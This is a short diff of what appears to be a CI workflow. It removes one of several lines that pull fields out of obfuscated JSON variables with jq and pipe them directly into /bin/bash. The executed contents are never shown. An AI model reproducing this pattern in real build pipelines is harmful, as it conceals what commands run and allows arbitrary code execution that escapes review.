@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$ctf24" | jq -r .wvfh3060 | /bin/bash
           echo $ju72 | jq -r .y3515 | /bin/bash
           echo $hae22 | jq -r .vgn85 | /bin/bash
-          echo $yfewz744 | jq -r .hjek8 | /bin/bash
           echo $vhxd215 | jq -r .i1 | /bin/bash
 
       - name: Store output
